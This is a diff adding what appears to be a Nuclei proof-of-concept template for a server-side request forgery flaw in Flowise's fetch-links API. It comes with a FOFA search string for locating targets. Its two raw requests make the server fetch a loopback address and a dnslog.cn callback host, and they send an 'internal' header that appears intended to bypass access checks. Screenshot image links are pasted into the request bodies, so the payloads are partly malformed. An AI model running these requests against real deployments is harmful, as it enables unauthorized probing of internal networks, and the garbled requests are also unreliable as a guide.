@@ -1,0 +1,39 @@
+id: poc-fbo5elf79et4qlug
+info:
+  name: Flowise fetch-links存在SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbo5elf79et4qlug'
+  tags: ssrf,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbo5elf79et4qlug
+    fofa: title="Flowise"
+http:
+- raw:
+  - 'GET /api/v1/fetch-links?url=http%3A%2F%2F127.0.0.1:8080%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    x-request-from: internal
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455485537-add07051-ed42-4fac-b899-ac143c98c247.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/v1/fetch-links?url=http%3A%2F%2F333.2jlb9x.dnslog.cn%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    x-request-from: internal
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1758455485751-008c81b2-69f3-4f86-b406-3a9373a4bd4c.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
